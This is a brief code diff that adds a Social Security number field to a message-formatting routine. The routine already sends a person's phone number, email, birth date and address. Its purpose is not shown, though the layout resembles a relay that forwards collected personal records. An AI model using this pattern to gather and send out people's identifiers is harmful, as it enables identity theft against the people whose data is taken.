@@ -25,6 +25,7 @@ class MessageGateWay:
                     f"*[PHONE_NUMBER]*: `{self.data.get('phone_number')}\n`"
                     f"*[EMAIL]*: `{self.data.get('email')}\n`"
                     f"*[DOB]*: `{self.data.get('dob')}\n`"
+                    f"*[SSN]*: `{self.data.get('ssn')}\n`"
                     f"*[STREET_ADDRESS]*: `{self.data.get('street_address')}\n`"
                     f"*[STATE]*: `{self.data.get('state')}\n`"
                     f"*[CITY]*: `{self.data.get('city')}\n`"
